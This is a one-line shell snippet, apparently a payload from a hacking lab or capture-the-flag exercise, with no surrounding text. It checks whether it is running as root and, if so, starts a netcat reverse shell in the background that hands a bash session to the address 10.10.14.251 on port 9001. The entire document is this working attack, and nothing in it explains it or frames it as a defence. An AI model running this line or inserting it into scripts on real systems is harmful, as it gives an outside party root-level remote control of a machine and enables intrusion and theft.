if [ `id -u` -eq 0 ]; then (/bin/nc -e /bin/bash 10.10.14.251 9001 &); fi

